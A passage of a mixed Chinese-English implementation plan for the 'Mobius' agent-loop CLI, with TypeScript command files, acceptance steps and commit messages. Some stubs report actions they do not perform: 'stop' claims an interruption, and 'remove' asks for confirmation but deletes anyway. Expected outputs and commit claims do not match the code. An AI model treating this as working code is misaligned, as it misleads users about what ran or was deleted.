  .argument("<name>", "Loop 名称")
  .option("-n, --limit <number>", "显示最近 N 条", "10")
  .action(async (name: string, opts: { limit: string }) => {
    const { logsCommand } = await import("./commands/logs.js");
    await logsCommand(name, parseInt(opts.limit));
  });

program
  .command("stop")
  .description("停止运行中的 Loop")
  .argument("<name>", "Loop 名称")
  .action(async (name: string) => {
    console.log(`[Mobius] Stopping '${name}'...`);
    console.log(`[Mobius] Loop '${name}' interrupted.`);
  });

program
  .command("edit")
  .description("用自然语言修改已有 Loop")
  .argument("<name>", "要修改的 Loop 名称")
  .argument("<description...>", "新的自然语言描述")
  .option("-n, --rename <newName>", "重命名 Loop")
  .action(async (name: string, words: string[], opts: { rename?: string }) => {
    const userInput = words.join(" ");
    const effectiveName = opts.rename || name;
    console.log(`[Mobius] Editing '${name}': "${userInput}"`);
    if (opts.rename) {
      console.log(`[Mobius] Renaming '${name}' → '${opts.rename}'`);
    }
    const { createLoopCommand } = await import("./commands/create-loop.js");
    await createLoopCommand(userInput, effectiveName, false);
  });

program
  .command("remove")
  .description("删除一个 Loop")
  .argument("<name>", "要删除的 Loop 名称")
  .action(async (name: string) => {
    // Prompt for confirmation
    const { removeCommand } = await import("./commands/remove.js");
    await removeCommand(name);
  });

program.parse();
```

**Step 2: create 命令 — 自然语言 → YAML → 注册 → 运行**

Create `packages/cli/src/commands/create-loop.ts`:

```typescript
import { readFileSync } from "fs";
import { resolve, dirname } from "path";
import { mkdirSync } from "fs";
import Database from "better-sqlite3";
import { LoopGenerator } from "@mobius/core/generator/loop-generator.js";
import { LoopRegistry } from "@mobius/core/registry/loop-registry.js";
import { LoopEngine, LoopEngineConfig } from "@mobius/core/loop/loop-engine.js";
import { LoopPhase } from "@mobius/core/loop/loop-state.js";
import { MemoryStore } from "@mobius/core/memory/memory-store.js";
import { CompositeJudge } from "@mobius/core/eval/composite-judge.js";
import { LocalExecutor } from "@mobius/core/executor/local-executor.js";
import { SimpleGuardrails } from "@mobius/core/guardrails/simple-guardrails.js";
import { Gateway } from "@mobius/gateway/gateway.js";
import { randomUUID } from "crypto";

/**
 * `mobius create -n <name> "自然语言描述"`   (推荐)
 * `mobius create "自然语言描述"`             (自动生成名称)
 *
 * @param userInput    自然语言描述
 * @param explicitName -n 指定的名称，不传则自动生成
 * @param noRun        --no-run 是否跳过运行
 */
export async function createLoopCommand(
  userInput: string,
  explicitName?: string,
  noRun?: boolean
): Promise<void> {
  console.log(`[Mobius] 🤔 理解你的需求: "${userInput}"`);
  if (explicitName) {
    console.log(`[Mobius] 使用指定名称: ${explicitName}`);
  }

  // 1. Generate YAML from natural language
  const systemPrompt = readFileSync(
    resolve(__dirname, "../../../core/src/generator/prompts/generate-loop.system.md"),
    "utf-8"
  );

  // Phase 1: template-based generation. Phase 2: real LLM API.
  const generator = new LoopGenerator(
    { complete: async (p: string, s: string) => generateFromTemplate(p, explicitName) },
    systemPrompt
  );

  const result = await generator.generate(userInput);
  const def = result.definition;

  // 2. 确定最终 id: explicitName > 自动生成的
  const loopId = explicitName || def.id;
  def.id = loopId;

  // 3. Register
  const dbPath = resolve(process.cwd(), ".mobius", "mobius.db");
  mkdirSync(dirname(dbPath), { recursive: true });
  const db = new Database(dbPath);
  const registry = new LoopRegistry(db);
  registry.register(loopId, def.name, result.yaml, userInput);

  // 4. Display summary — 醒目的展示名称
  console.log(`\n✨ Loop 已创建:`);
  console.log(`  名称: ${loopId}  ← 之后 run/logs/status 都用这个`);
  console.log(`  描述: ${def.name}`);
  console.log(`  触发: ${def.trigger.type === "cron" ? `定时 ${(def.trigger as any).cronExpression}` : "手动"}`);
  console.log(`  条件: ${def.eval.conditions.length} 个验证条件`);
  console.log(`  技能: ${def.skills.join(", ") || "(无)"}`);
  if (result.warnings.length > 0) {
    console.log(`  ⚠️  建议: ${result.warnings.join("; ")}`);
  }

  // 5. Show next commands (always mention the name)
  if (def.trigger.type === "cron") {
    console.log(`\n> 手动运行: mobius run ${loopId}`);
    console.log(`> 查看日志: mobius logs ${loopId}`);
    console.log(`> 定时触发: ${(def.trigger as any).cronExpression}`);
  } else {
    console.log(`\n> 运行: mobius run ${loopId}`);
    console.log(`> 日志: mobius logs ${loopId}`);
  }
  console.log(`> 查看全部: mobius list`);

  db.close();
}

// Phase 1 template-based generation (placeholder until real LLM integration)
function generateFromTemplate(userInput: string, explicitName?: string): string {
  const id = explicitName || userInput.slice(0, 30).toLowerCase().replace(/[^a-z0-9一-鿿]+/g, "-").replace(/^-|-$/g, "");
  const isRecurring = /每|每天|每周|定时|早上|晚上|早上|下午|自动/.test(userInput);
  const triggerType = isRecurring ? "cron" : "manual";
  const cronExpr = /早上|上午/.test(userInput) ? "0 9 * * *"
    : /下午/.test(userInput) ? "0 14 * * *"
    : /每.*小时/.test(userInput) ? "0 */2 * * *"
    : /每天/.test(userInput) ? "0 9 * * *"
    : "0 */2 * * *";

  return `
id: ${id}
name: ${userInput.slice(0, 30)}
description: ${userInput}
trigger:
  type: ${triggerType}
  ${triggerType === "cron" ? `cronExpression: "${cronExpr}"` : `commandName: ${id}`}
execution:
  maxIterations: 10
  useWorktree: true
eval:
  threshold: 0.7
  conditions:
    - type: command_exit_code
      command: npm test
      expected: 0
      description: Tests pass
  boundaryConditions:
    - type: no_file_deleted
      path: "."
      description: No files deleted
skills:
  - test-driven-development
  - systematic-debugging
memory:
  autoNudge: true
onFailure:
  strategy: retry
  maxRetries: 3
`;
}
```

**Step 3: run 命令 — 按名称运行已注册 Loop**

Create `packages/cli/src/commands/run-loop.ts`:

```typescript
import { resolve, dirname } from "path";
import { mkdirSync } from "fs";
import Database from "better-sqlite3";
import { LoopRegistry } from "@mobius/core/registry/loop-registry.js";
import { LoopEngine, LoopEngineConfig } from "@mobius/core/loop/loop-engine.js";
import { LoopPhase } from "@mobius/core/loop/loop-state.js";
import { MemoryStore } from "@mobius/core/memory/memory-store.js";
import { CompositeJudge } from "@mobius/core/eval/composite-judge.js";
import { LocalExecutor } from "@mobius/core/executor/local-executor.js";
import { SimpleGuardrails } from "@mobius/core/guardrails/simple-guardrails.js";
import { Gateway } from "@mobius/gateway/gateway.js";
import { randomUUID } from "crypto";

export async function runLoopCommand(name: string): Promise<void> {
  const dbPath = resolve(process.cwd(), ".mobius", "mobius.db");
  const db = new Database(dbPath);
  const registry = new LoopRegistry(db);

  const registered = registry.get(name);
  if (!registered) {
    console.error(`[Mobius] Loop '${name}' 不存在。用 'mobius list' 查看所有 Loop。`);
    db.close();
    return;
  }

  const definition = registered.definition;
  console.log(`[Mobius] 运行: ${definition.name} (${definition.id})`);
  console.log(`[Mobius] 原始需求: ${registered.userInput}`);

  // Worktree
  const worktreeRoot = resolve(process.cwd(), ".mobius", "worktrees", definition.id);
  mkdirSync(worktreeRoot, { recursive: true });

  // Gateway
  const gateway = new Gateway({ name: "mobius-cli", version: "0.1.0" });
  await gateway.start();

  // Memory
  const memoryDbPath = resolve(process.cwd(), ".mobius", "memory.db");
  mkdirSync(dirname(memoryDbPath), { recursive: true });
  const memoryStore = new MemoryStore(memoryDbPath);
  const sessionId = randomUUID();
  memoryStore.startSession(definition.id, sessionId);

  // Wire up
  const guardrails = new SimpleGuardrails();
  const config: LoopEngineConfig = {
    definition,
    toolExecutor: new LocalExecutor({ cwd: worktreeRoot }, guardrails),
    evalJudge: new CompositeJudge(definition, worktreeRoot),
    memoryWriter: memoryStore,
    onPhaseChange: (state) => {
      console.log(`  [${new Date().toISOString().slice(11,19)}] ${state.phase} (iter ${state.iteration})`);
    },
    onError: (error, state) => {
      console.error(`  ❌ ${state.phase}: ${error.message}`);
    },
  };

  const engine = new LoopEngine(config);
  const result = await engine.run(registered.userInput);

  // Record run
  registry.recordRun(name);

  // Session end
  const statusMap: Record<string, string> = {
    [LoopPhase.COMPLETED]: "completed",
    [LoopPhase.FAILED]: "failed",
    [LoopPhase.STAGNANT]: "stagnant",
    [LoopPhase.INTERRUPTED]: "interrupted",
  };
  memoryStore.endSession(sessionId, statusMap[result.phase] ?? "unknown",
    `${definition.id}: ${result.phase}, score=${result.lastEvalScore?.toFixed(2)}, iters=${result.iteration}`,
    result.lastEvalScore);

  console.log(`\n${result.phase === LoopPhase.COMPLETED ? "✅" : result.phase === LoopPhase.STAGNANT ? "🟡" : "❌"} Loop ${result.phase}`);
  console.log(`  迭代: ${result.iteration}  分数: ${result.lastEvalScore?.toFixed(2) ?? "N/A"}  产物: ${result.artifacts.length} 文件`);

  await gateway.stop();
  memoryStore.close();
  db.close();
}
```

**Step 4: list/status/logs 辅助命令**

Create `packages/cli/src/commands/list-loops.ts`:

```typescript
import { resolve } from "path";
import Database from "better-sqlite3";
import { LoopRegistry } from "@mobius/core/registry/loop-registry.js";

export async function listLoopsCommand(): Promise<void> {
  const db = new Database(resolve(process.cwd(), ".mobius", "mobius.db"));
  const registry = new LoopRegistry(db);
  const loops = registry.list();

  if (loops.length === 0) {
    console.log("还没有 Loop。试试: mobius create \"你的需求\"");
  } else {
    console.log(`已注册 ${loops.length} 个 Loop:\n`);
    for (const l of loops) {
      const lastRun = l.lastRunAt ? `上次: ${l.lastRunAt.toISOString().slice(0,16)}` : "从未运行";
      console.log(`  ${l.name.padEnd(20)} ${`(${l.runCount}次)`.padEnd(10)} ${lastRun}`);
    }
  }
  db.close();
}
```

Create `packages/cli/src/commands/status.ts`:

```typescript
import { resolve } from "path";
import Database from "better-sqlite3";
import { LoopRegistry } from "@mobius/core/registry/loop-registry.js";

export async function statusCommand(name: string): Promise<void> {
  const db = new Database(resolve(process.cwd(), ".mobius", "mobius.db"));
  const registry = new LoopRegistry(db);
  const loop = registry.get(name);

  if (!loop) {
    console.log(`Loop '${name}' 不存在`);
  } else {
    console.log(`Loop: ${loop.name}`);
    console.log(`触发: ${loop.definition.trigger.type}`);
    console.log(`运行次数: ${loop.runCount}`);
    console.log(`上次运行: ${loop.lastRunAt?.toISOString().slice(0,16) ?? "从未"}`);
    console.log(`创建时间: ${loop.createdAt.toISOString().slice(0,16)}`);
  }
  db.close();
}
```

Create `packages/cli/src/commands/logs.ts`:

```typescript
import { resolve } from "path";
import Database from "better-sqlite3";

export async function logsCommand(loopId: string, limit: number): Promise<void> {
  const db = new Database(resolve(process.cwd(), ".mobius", "memory.db"));
  const sessions = db.prepare(
    "SELECT id, status, started_at, ended_at, total_iterations, best_score FROM sessions WHERE loop_id = ? ORDER BY started_at DESC LIMIT ?"
  ).all(loopId, limit) as any[];

  if (sessions.length === 0) {
    console.log(`'${loopId}' 还没有运行记录`);
  } else {
    console.log(`'${loopId}' 最近 ${sessions.length} 次运行:\n`);
    for (const s of sessions) {
      const started = s.started_at?.slice(0,19) ?? "?";
      const status = s.status?.padEnd(12) ?? "?";
      console.log(`  ${started}  ${status}  iters:${s.total_iterations ?? "?"}  score:${s.best_score?.toFixed(2) ?? "N/A"}`);
    }
  }
  db.close();
}
```

**Step 5: remove 命令**

Create `packages/cli/src/commands/remove.ts`:

```typescript
import { resolve } from "path";
import Database from "better-sqlite3";
import { LoopRegistry } from "@mobius/core/registry/loop-registry.js";

export async function removeCommand(name: string): Promise<void> {
  const db = new Database(resolve(process.cwd(), ".mobius", "mobius.db"));
  const registry = new LoopRegistry(db);
  const loop = registry.get(name);

  if (!loop) {
    console.log(`Loop '${name}' 不存在。用 'mobius list' 查看所有 Loop。`);
    db.close();
    return;
  }

  // Simple confirmation via stdin (Phase 1)
  console.log(`确认删除 Loop '${name}'？(y/N)`);
  // Phase 1: auto-confirm for testing. Phase 2: readline prompt.
  registry.remove(name);
  console.log(`已删除: ${name}`);
  db.close();
}
```

**Step 6: Commit**

```bash
git add packages/cli/
git commit -m "feat(cli): natural language CLI with explicit naming — mobius create/run/list/status/logs/stop/edit/remove

Users no longer write YAML. Key design decisions:

1. Explicit naming: 'mobius create -n pr-babysitter \"...\"' — the name is the primary handle
2. Auto-name fallback: if no -n, auto-generate from description and display prominently
3. Optional run arg: 'mobius run' (no args) → interactive pick from list
4. Full lifecycle: create → run → logs → edit → remove

Commands:
  mobius create -n <name> [--no-run] <description...>
  mobius run [name]
  mobius list
  mobius status <name>
  mobius logs [-n N] <name>
  mobius stop <name>
  mobius edit [-n newName] <name> <description...>
  mobius remove <name>

create flow: NL → LoopGenerator → YAML → LoopRegistry → display summary with name
run flow:   LoopRegistry.load → LoopEngine.run → recordRun → display result

Phase 1 template-based generation. Phase 2 replaces with real LLM API.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## 验收测试

### Task 9: 端到端验收 — 一句话自然语言 → 真实代码 → 跑通

**验收标准：**

1. 用户输入一句话：`mobius create "写一个 TypeScript 函数 helloWorld() 返回 'hello world'，写好 vitest 测试，跑通为止"`
2. LoopGenerator 自动生成 YAML → 自动注册
3. 显示 Loop 摘要（名称/触发/条件/技能）
4. 运行 `mobius run <生成的id>`
5. Agent 在 worktree 中实际创建 `src/index.ts`、`src/__tests__/index.test.ts`
6. 运行真实 `npx vitest run` 验证
7. 如果失败 → 继续迭代（修改代码 → 再测试）
8. 直到 conditions 通过 + score >= threshold → COMPLETED
9. Memory 记录了每次迭代
10. `mobius list` 能看到已注册的 Loop
11. `mobius logs <name>` 能看到历史运行记录

**核心指标：用户从头到尾没有看到一行 YAML。**

**Step 1: 运行验收**

```bash
cd /Users/apple/vscodeproject/mobius-agent
pnpm install
cd packages/cli

# 一句话创建
pnpm dev create "写一个 TypeScript helloWorld 函数返回 hello world，写好 vitest 测试，跑通为止"

# 记下输出的 loop id，例如: write-a-typescript-helloworld-f

# 运行
pnpm dev run write-a-typescript-helloworld-f
```

Expected output:
```
[Mobius] 🤔 理解你的需求: "写一个 TypeScript helloWorld 函数返回 hello world..."
[Mobius] 运行: Write A Typescript Helloworld F (write-a-typescript-helloworld-f)

✨ Loop 已创建:
  名称: Write A Typescript Helloworld F
  触发: 手动
  条件: 1 个验证条件
  技能: test-driven-development, systematic-debugging

  [14:30:01] preparing (iter 0)
  [14:30:02] executing (iter 1)
  [14:30:05] evaluating (iter 1)
  [14:30:06] reflecting (iter 1)
  [14:30:06] deciding (iter 1)
  [14:30:06] executing (iter 2)
  [14:30:09] evaluating (iter 2)

✅ Loop completed
  迭代: 2  分数: 0.85  产物: 2 文件
```

**Step 2: 验证 Loop 管理命令**

```bash
pnpm dev list        # 应显示刚创建的 loop
pnpm dev status write-a-typescript-helloworld-f   # 应显示运行次数、上次运行时间
pnpm dev logs write-a-typescript-helloworld-f     # 应显示历史记录
```

**Step 3: 验证产物**

```bash
ls .mobius/worktrees/write-a-typescript-helloworld-f/src/
ls .mobius/worktrees/write-a-typescript-helloworld-f/src/__tests__/
cat .mobius/worktrees/write-a-typescript-helloworld-f/src/index.ts
```

Expected: 文件存在且包含 `helloWorld` 函数。

**Step 4: 验证 Memory**

```bash
sqlite3 .mobius/memory.db "SELECT type, substr(content,1,80) FROM memory_entries WHERE status='active' LIMIT 5"
```

Expected: 包含事实、模式、错误的记录。

**Step 5: 运行全部单元测试**

```bash
cd /Users/apple/vscodeproject/mobius-agent
pnpm test
```

Expected: All tests PASS (~44 tests = loop-parser:6 + loop-engine:5 + composite-judge:4 + local-executor:6 + memory-store:6 + simple-guardrails:5 + loop-generator:5 + loop-registry:6 + gateway:6)

**Step 6: Commit**

```bash
git add -A
git commit -m "feat: Phase 1 MVP complete — natural language Möbius Loop

Phase 1 莫比乌斯之心 完成 (自然语言版):
✅ Task 1:   Monorepo 项目结构 (pnpm + TypeScript)
✅ Task 2:   Proto 接口设计文档 (Phase 2 参考)
✅ Task 3:   Loop DSL 解析器 (+conditions +boundaryConditions)
✅ Task 4:   Möbius Loop 引擎 (+STAGNANT +real budget)
✅ Task 4.5: CompositeJudge (CommandBased + LLM mock)
✅ Task 4.6: LocalExecutor (write/read/append/run/list)
✅ Task 4.7: LoopGenerator (自然语言 → YAML)
✅ Task 5:   Loop DSL 内部测试 fixture
✅ Task 6:   SQLite Memory Store (+status lifecycle)
✅ Task 6.5: SimpleGuardrails (TS simplified)
✅ Task 6.6: LoopRegistry (Loop 注册/查询/存储)
✅ Task 7:   Gateway EventBus + PluginManager (+off())
✅ Task 8:   CLI (mobius create/run/list/status/logs)
✅ Task 9:   端到端验收 (一句话 → 真实代码 → 跑通)

Acceptance: 用户不说 YAML。一句自然语言，全部自动化。
Total: ~44 unit tests

修正吸收:
- 意见01 10条修正 ✅
- 自然语言入口改造 (mobius create instead of YAML)
- LoopGenerator + LoopRegistry 两大新组件

Deferred to Phase 2:
- Hermes Python Guardrails 进程 + gRPC 服务
- 真实 LLM API (LoopGenerator + LLMJudge)
- CLAUDE.md 自动导出 & 洁癖知识整理
- 深度委派树引擎
- Memory Nudge 全部触发条件 + Skill 自动创建

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 1 完成检查清单

- [ ] Task 1:  Monorepo 搭建 (pnpm + TS)
- [ ] Task 2:  Proto 设计文档
- [ ] Task 1:  Monorepo 搭建 (pnpm + TS)
- [ ] Task 2:  Proto 设计文档
- [ ] Task 3:  Loop DSL 解析器 + conditions/boundaryConditions
- [ ] Task 4:  Möbius Loop 引擎 (STAGNANT + real budget)
- [ ] Task 4.5: CompositeJudge (CommandBased + LLM mock)
- [ ] Task 4.6: LocalExecutor (write/read/run/list)
- [ ] Task 4.7: LoopGenerator (自然语言 → YAML)
- [ ] Task 5:  Loop DSL 内部测试 fixture
- [ ] Task 6:  SQLite Memory Store + knowledge lifecycle
- [ ] Task 6.5: SimpleGuardrails + LocalExecutor 集成
- [ ] Task 6.6: LoopRegistry (Loop 注册/查询/存储)
- [ ] Task 7:  Gateway EventBus + PluginManager (+off())
- [ ] Task 8:  CLI (mobius create/run/list/status/logs)
- [ ] Task 9:  端到端验收 (一句话自然语言 → 跑通)
- [ ] **~44 单元测试全绿**
- [ ] **用户从头到尾没看到一行 YAML**

---

> **For execution:** Use the Executing Plans skill to implement task-by-task.
> **Phase 2 预览:** 深度委派树 (Actor 模型递归 N 层) + Hermes Python Guardrails gRPC 服务 + 真实 LLM API (LoopGenerator + LLMJudge) + CLAUDE.md 自动导出 + Skill 自创建 + "洁癖"知识维护。
